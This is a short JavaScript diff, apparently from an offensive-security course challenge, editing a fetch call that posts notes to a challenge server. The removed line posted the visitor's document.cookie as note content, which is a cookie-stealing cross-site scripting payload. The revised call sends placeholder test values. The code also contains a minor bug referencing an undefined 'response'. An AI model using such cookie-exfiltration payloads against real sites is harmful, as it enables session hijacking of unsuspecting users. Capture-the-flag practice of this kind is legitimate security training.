@@ -15,10 +15,9 @@ formData.append('submit', 'save');
 //.then(res=>{
 //
 //});
-fetch("http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/note/new", {
+fetch("http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/note/new?title=test&content=test&submit=save", {
     method: "POST",
     credentials: "same-origin",
-    body: JSON.stringify({title: 'test', 'content': document.cookie, 'submit': 'save'})
 }).then(res => {
     alert(response.json);
 });
